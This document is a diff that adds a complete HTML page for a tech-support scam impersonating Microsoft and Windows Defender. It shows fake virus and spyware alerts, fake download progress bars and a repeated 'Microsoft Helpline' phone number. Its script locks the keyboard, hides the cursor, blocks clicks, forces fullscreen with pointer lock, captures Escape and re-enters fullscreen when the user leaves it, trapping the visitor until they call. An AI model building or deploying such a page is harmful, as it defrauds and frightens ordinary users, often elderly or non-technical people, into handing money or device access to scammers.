@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft Security Alert</title>
+</head>
+<style>
+    *{
+        box-sizing: border-box;
+        margin: 0px;
+        padding: 0px;
+    }
+    .warrning{
+        display: none;
+        position: relative;
+        margin-left: 18%;
+        padding: 10px;
+        height: 150px;
+        width: 65%;
+        background-color: rgb(12, 11, 11);
+        color: white;
+        text-align: center;
+        cursor: none;
+        pointer-events: none;
+        z-index: 1;
+    }
+    .popup-main{
+        background-image: url("Assets/Screenshot\ \(259\).png");
+        background-color: rgba(0, 0, 0, 0.7);
+        background-size: 100% 100%;
+        position: sticky;
+        height:740px;
+        width: 100%;
+    }
+    .popup-gif{
+        box-shadow: 0 5px 10px rgba(0, 0, 0, 0.363);
+       height: 430px;
+       width: 600px;
+       position: absolute;
+       left: 28%;
+       top: 18%;
+       display: grid;
+       grid: 80px / auto auto;
+       grid-gap: 10px;
+       background-color: white;
+       padding:15px ;
+       padding-top: 50px;
+    }
+
+    .progress{
+        margin-top: 10px;
+        width: 180px;
+
+    }
+    .file-container {
+      display: flex;
+      align-items: center;
+      font-family: Arial, sans-serif;
+      width: 280px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .file-icon {
+      width: 30px;
+      height: 40px;
+      /* background-color: #ddd; */
+      margin-right: 10px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-radius: 3px;
+    }
+    .file-icon::before {
+      content: "file";
+      font-size: 12px;
+      font-weight: bold;
+      color: #fff;
+      background-color: #6b6bbf;
+      padding: 5px;
+      border-radius: 3px;
+    }
+    .file-info {
+      flex-grow: 1;
+      margin-left: 20px;
+    }
+    .file-name {
+      font-size: 14px;
+      color: #333;
+    }
+    .file-size {
+      font-size: 12px;
+      color: #666;
+    }
+    .support{
+        /* border:1px solid red; */
+        margin-bottom: 50px;
+        width: 560px;
+        height: 60px;
+        text-align: center;
+        
+    }
+
+.popup-content{
+    background-color: rgb(255, 255, 255);
+    min-height: 230px;
+    width: 500px;
+    border-radius: 5px;
+    text-align: center;
+    position: fixed;
+    left: 32%;
+    top: 25%;
+    padding: 30px;
+    padding-bottom: 50px;
+    box-shadow: 1px 5px 10px gray;
+    z-index: 999;
+}
+
+.popup-content p{
+    font-weight: 800;
+    font-size: 1.2rem;
+    margin-top: 1.5rem;
+}
+
+.popup-content  h2{
+    margin-top: 1rem;
+}
+
+.popup-content h1{
+    margin-top: 1rem;
+}
+
+.popup-content p span{
+    font-size: 1.5rem;
+    color: #e8281a;
+}
+.asst{
+    width: 100%;
+    margin-left: -350px;
+    display: flex;
+    justify-content: center;
+    gap: 50px;
+    align-items: center;
+    margin-top: 2rem;
+
+}
+.asst img{
+    width: 130px;
+}
+.asst button{
+  background-color: #1a73e8;
+  color: white;
+  cursor: pointer;
+  border: none;
+  height: 40px;
+  width: 100px;
+  padding: 10px 20px;
+  border-radius: 4px;
+  margin-left:60px;
+}
+.cstbtno{
+    display: flex;
+}
+
+.cst{
+    width: 100%;
+    display: flex;
+    justify-content: center;
+    gap: 50px;
+    align-items: center;
+    margin-top: 2rem;
+}
+
+.cst img{
+    width: 130px;
+}
+
+.cst button{
+  background-color: #1a73e8;
+  color: white;
+  cursor: pointer;
+  border: none;
+  padding: 10px 20px;
+  border-radius: 4px;
+  margin-left: px;
+  cursor: pointer;
+}
+
+.cst .leave{
+    animation: blink-animation 1s steps(5, start) infinite;
+    /* -webkit-animation: blink-animation 1s steps(5, start) infinite; */
+}
+
+@keyframes blink-animation {
+    to {
+        visibility: hidden;
+    }
+}
+@-webkit-keyframes blink-animation {
+    to {
+        visibility: hidden;
+    }
+}
+.call {
+    position: absolute;
+    top: 10px;
+    right: 10px;
+    font-size: 14px;
+    cursor: pointer;
+    pointer-events: painted;
+    border: 2px solid black;
+    padding: 6px 10px;
+    border-radius: 4px;
+}
+
+.call:hover{
+    background-color: red;
+    color: white;
+    border: none;
+}
+
+    #footer {
+    width: 100%;
+    position: fixed;
+    bottom: 0;
+    background-color: #1a73e8;
+    z-index: 9999;
+    padding: 30px 34px;
+    color: #fff;
+    font-size: 18px;
+    height: 80px;
+    cursor: pointer;
+    left: 0;
+}
+#footertxt, #footertxt2 {
+font-size: 20px;
+}
+#footertxt img {
+    width: 23px;
+    vertical-align: text-top;
+    }
+.float{
+background-color: #fff;
+border-radius: 10px;
+height: 80px;
+width: 300px;
+position: fixed;
+right: 0px;
+bottom: 45%;
+padding-left: 50px;
+}
+.float img{
+    height: 15px;
+    width: 20px;
+    padding-right: 5px;
+}
+.float h3{
+    padding: 8px;
+    font-size: medium;
+}
+       
+.fullscreen {
+      width: 100vw;
+      height: 100vh;
+      background-color: black;
+      cursor: none;
+      pointer-events: none;
+      transition: background-color 0.1s ease-in-out;
+    }
+.white {
+      background-color:white;
+    }
+#ff{
+        display: block;
+        background-color: black;
+    }
+#h{
+    animation: blink-animation 1s steps(5, start) infinite;
+    -webkit-animation: blink-animation 1s steps(5, start) infinite; 
+}
+#w{
+    background-color: black;
+}
+
+@keyframes blink-animation {
+    to {
+        visibility: hidden;
+    }
+}
+@-webkit-keyframes blink-animation {
+    to {
+        visibility: hidden;
+    }
+}
+.alert-box {
+      width: 400px;
+      padding: 20px;
+      background-color: white;
+      box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+    }
+
+    .header img {
+      height: 30px;
+    }
+    .header h2 {
+      font-size: 19px;
+      margin: 0;
+      margin-left: 5px;
+      
+    }
+
+    .threat-info {
+      margin: 20px 0;
+    }
+
+    .threat-info p {
+      margin: 5px 0;
+    }
+
+    .threat-info .red-text {
+      color: red;
+    }
+
+    .icons {
+      display: flex;
+      justify-content: center;
+      margin: 20px 0;
+    }
+
+    .icons img {
+      height: 50px;
+      width: 250px;
+      margin-left: 5px;
+    }
+
+    .block-message {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .block-message a {
+      color: blue;
+      text-decoration: none;
+    }
+
+    .buttons {
+      display: flex;
+      justify-content: flex-end;
+     cursor: pointer;
+    }
+
+    .buttons button {
+      padding: 8px 20px;
+      margin-left: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .deny-btn {
+      background-color: #f0f0f0;
+    }
+
+    .allow-btn {
+      background-color: #0078d4;
+      color: white;
+    }
+</style>
+<body>
+    <div id="ff">
+    <div class="popup-main" id="popup-main">
+
+        <div class="warrning" id="warrning">
+            <p>A Microsoft Windows Security scan has detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, images, or documents.</p>
+            <br><p>Please contact us immediately so that our engineer can explain the removal process over the phone.
+            Please contact Microsoft Windows Support immediately to report this threat, prevent spoofing, and unlock access to this device.
+        </p></div>
+        <div class="popup-gif">
+            <div class="data">
+            <div class="file-container">
+                <div class="file-icon"></div>
+                <div class="file-info">
+                  <div class="file-name">bdg*g_ii.document</div>
+                  <div class="file-size">62 MB/s</div>
+                    <progress class="progress" id="progress1" value="0" max="100"></progress>
+                </div>
+              </div>
+            </div>
+            <div class="data" style="margin-left: -285px;">
+            <div class="file-container">
+                <div class="file-icon"></div>
+                <div class="file-info">
+                  <div class="file-name">yupd#$%*.download</div>
+                  <div class="file-size">26 MB/s</div>
+                    <progress class="progress" id="progress2" value="0" max="100"></progress>
+                </div>
+              </div>
+          </div>
+            <div class="data">
+            <div class="file-container">
+                <div class="file-icon"></div>
+                <div class="file-info">
+                  <div class="file-name">yuy_67^$.file</div>
+                  <div class="file-size">27 MB/s</div>
+                  <progress class="progress" id="progress3" value="0" max="100"></progress>
+                </div>
+              </div>
+            </div>
+            <div class="data" style="margin-left: -285px;">
+            <div class="file-container">
+                <div class="file-icon"></div>
+                <div class="file-info">
+                  <div class="file-name">yyty$$*_3.c://</div>
+                  <div class="file-size">22 MB/s</div>
+                  <progress class="progress" id="progress4" value="0" max="100"></progress></progress>
+                </div>
+              </div>
+            </div>
+            <span class="support">
+                <h3>Access has been blocked.</h3> 
+                <h2 style="margin-top: 5px; color: #1a73e8;">Contact Microsoft Helpline : +1 (833) 734 3733</h2>  
+                </span>
+                
+                <div class="asst">
+                    <div class="img">
+                    <img src="https://itsti.com.br/wp-content/uploads/2021/10/microsoft-ge28eb04f2_1280.png" alt="">
+                </div>
+                    <div class="cstbtno">
+                        <button class="scan" onclick="call()">Call Now</button>
+                        <button class="leave">Leave</button>
+                    </div>
+                </div>
+        </div>
+        <div class="popup-content" id="popup-content">
+             <img src="Assets/re.gif" alt="">
+             <p>Threat Detected: <span>1000701</span> Virus found</p>
+             <h2>Customer Service</h2>
+             <h1 style="color: #1a73e8;">+1 (833) 734 3733</h1>
+             <div class="cst">
+                 <div class="img">
+                 <img src="https://itsti.com.br/wp-content/uploads/2021/10/microsoft-ge28eb04f2_1280.png" alt="">
+             </div>
+                 <div class="cstbtn">
+                     <button class="scan" onclick="blik()">Call Now</button>
+                     <button class="leave" onclick="blik()">Leave</button>
+                 </div>
+             </div>
+         </div>
+        <div id="footer">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="right-foot" style="text-align: center;">
+                    <span id="footertxt"><img src="Assets/microsoft.png"> Microsoft Customer Service : </span><span style="font-weight: 800;padding-left: 13px;color: #fff; font-family:inherit;"><span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;">+1 (833) 734 3733 (Toll Free) </span></span>
+                </div>
+            </div>
+            <div class="col-md-12">
+                <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 12px;"><strong>Security Note :</strong> Malware is known to steal information from your device and use your identity to do malicious transactions. Due to COVID-19, data theft incidents via a fraudulent advertisement that injects adware to your browser Microsoft Windows have increased by 624%. Because of this, we recommend a security application that can remove Adware and Malware for you. The app can also speed up your browser, blocks aggressive ads, and a lot more</small></marquee>
+            </div>
+        </div>
+      </div>
+    
+       <div class="float" onclick="call()">
+        <h3><img src="Assets/microsoft.png">Microsoft Customer Service</h3>
+        <h2>+1 (833) 734 3733</h2>
+      </div> 
+    </div> <!-- mainpop -->
+</div>
+    <div class="fullscreen" id="fullscreen" style="height: 100; width: 100%; display: none;">
+        <div class="warrning" id="w">
+            <p>A Microsoft Windows Security scan has detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, images, or documents.</p>
+            <br><p>Please contact us immediately so that our engineer can explain the removal process over the phone.
+            Please contact Microsoft Windows Support immediately to report this threat, prevent spoofing, and unlock access to this device.
+        </p></div>
+        <div class="popup-content" id="popup-" onclick="blik()"> 
+            <div class="header">
+               <img src="769-7697402_windows-defender-emblem.png" alt="" style="height: 30px; width: 35px;">
+                <span><h2>Windows Defender Security Center</h2></span>
+                <span class="close-btn">&times;</span>
+              </div>
+              <div class="threat-info">
+                <p><strong>App:</strong> Ads.financetrack(2).dll</p>
+                <p class="red-text"><strong>Threat Detected:</strong> Trojan Spyware</p>
+              </div>
+              <div class="icons">
+                <img src="Dolos-3PC-header-adjusted.jpg" alt="shield icon">
+              </div>
+              <div class="block-message">
+                <p>Access to this PC has been blocked for security reasons.</p>
+                <p><a href="#">Contact Microsoft Support: <span id="h">+1 (833) 734 3733</span></a></p>
+              </div>
+              <div class="cst">
+                <div class="img">
+                <img src="https://itsti.com.br/wp-content/uploads/2021/10/microsoft-ge28eb04f2_1280.png" alt="">
+            </div>
+                <div class="cstbtn">
+                    <button >Call Now</button>
+                    <button >Leave</button>
+                </div>
+            </div>
+        </div>
+        <div class="float" id="float" style="margin-bottom: -200px;">
+            <h3><img src="Assets/microsoft.png">Microsoft Customer Service</h3>
+            <h2>+1 (833) 734 3733</h2>
+          </div> 
+    </div>
+    <audio src="Assets/_Fm7-alert.mp3" id="backgroundmusic"></audio>
+    <script>
+        // lock keybord
+        navigator.keyboard.lock();
+        document.onkeydown = function (e) {
+        return false;
+        }
+
+        var popup= document.getElementById("popup-main");
+            popup.style.display = "flex";
+        var pop=document.getElementById("popup-content");
+        pop.style.display="none";
+    
+        document.onclick=function openPopup() {
+            const fullscreenDiv = document.getElementById('fullscreen');
+            pop.style.display='none';
+            popup.style.display = "block";
+            document.body.style.cursor = "none";
+            document.body.style.pointerEvents="none";
+            fullscreenDiv.style.display='block';
+
+            if (fullscreenDiv.requestFullscreen){
+                fullscreenDiv.requestFullscreen();
+                fullscreenDiv.requestPointerLock();
+            } else if (fullscreenDiv.webkitRequestFullscreen){ 
+                fullscreenDiv.webkitRequestFullscreen();
+                fullscreenDiv.requestPointerLock();
+            } else if (fullscreenDiv.msRequestFullscreen) { 
+                fullscreenDiv.msRequestFullscreen();
+                fullscreenDiv.requestPointerLock();
+            }
+            blik();  
+        }
+        
+         window.onload=function start() {
+            document.body.style.cursor="none";
+            document.body.style.pointerEvents="none";
+            var progress1 = document.getElementById("progress1");
+            var progress2 = document.getElementById("progress2");
+            var progress3 = document.getElementById("progress3");
+            var progress4= document.getElementById("progress4");
+    
+    var value1 = 0, value2 = 0, value3 = 0, value4=0;
+    var interval = setInterval(function() {
+      if (value1 < 100) {
+        value1 += 8;
+        progress1.value = value1;
+      }
+      if (value2 < 100) {
+        value2 += 9;
+        progress2.value = value2;
+      }
+      if (value3 < 100) {
+        value3 += 10;
+        progress3.value = value3;
+      }
+      if (value4 < 100) {
+        value4 += 8; 
+        progress4.value = value4;
+      }
+      if (value1 >= 100 && value2 >= 100 && value3 >= 100 && value4>=100) {
+        clearInterval(interval); 
+        pop.style.display='block'
+        warrning.style.display='block';
+      }
+    }, 100);
+}
+var float=document.getElementById('float');
+
+function blik() {
+      const fullscreenDiv = document.getElementById('fullscreen');
+      document.body.style.cursor = 'none';
+      var pop=document.getElementById('popup-');
+      pop.style.display="none";
+      float.style.display='none';
+      var w=document.getElementById('w');
+      w.style.display='none';
+      let isWhite = false;
+    const toggleColor = () => {
+      isWhite = !isWhite;
+      fullscreenDiv.classList.toggle('white', isWhite);
+    };
+    const intervalId = setInterval(toggleColor, 100);
+    setTimeout(() => {
+      clearInterval(intervalId); 
+      show();
+    }, 500);
+    }
+function show(){
+    document.body.style.cursor = 'none';
+    const fullscreenDiv = document.getElementById('fullscreen');
+    fullscreenDiv.style.backgroundColor='black';
+    var pop=document.getElementById('popup-');
+    pop.style.display="block";
+    var w=document.getElementById('w');
+      w.style.display='block';
+    float.style.display='block';
+}
+
+// Lock keyboard functionality with delay
+if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
+    document.addEventListener('fullscreenchange', async () => {
+        if (document.fullscreenElement) {
+            await navigator.keyboard.lock(['Escape']);
+            console.log('Escape key captured while in fullscreen.');
+        } else {
+            console.log('Exited fullscreen. Re-entering fullscreen after delay.');
+            setTimeout(() => {
+                goFullscreen();
+            }, 2000); // 2-second delay before re-entering fullscreen
+        }
+    });
+}
+
+// Function to enter fullscreen
+function goFullscreen() {
+    const fullscreenDiv = document.getElementById('fullscreen');
+    fullscreenDiv.style.display = 'block';
+    document.body.style.cursor = 'none';
+
+    if (fullscreenDiv.requestFullscreen) {
+        fullscreenDiv.requestFullscreen();
+    } else if (fullscreenDiv.webkitRequestFullscreen) {
+        fullscreenDiv.webkitRequestFullscreen();
+    } else if (fullscreenDiv.msRequestFullscreen) {
+        fullscreenDiv.msRequestFullscreen();
+    }
+
+    if (fullscreenDiv.requestPointerLock) {
+        fullscreenDiv.requestPointerLock();
+    }
+}
+
+// Trigger fullscreen on click
+document.addEventListener('click', async () => {
+    const fullscreenDiv = document.getElementById('fullscreen');
+    if (fullscreenDiv) {
+        try {
+            await fullscreenDiv.requestFullscreen();
+            console.log('Entered fullscreen.');
+            fullscreenDiv.requestPointerLock();
+            console.log('Pointer lock requested.');
+        } catch (err) {
+            console.error('Error entering fullscreen or pointer lock:', err);
+        }
+    }
+});
+
+    </script>
+</body>
+</html>
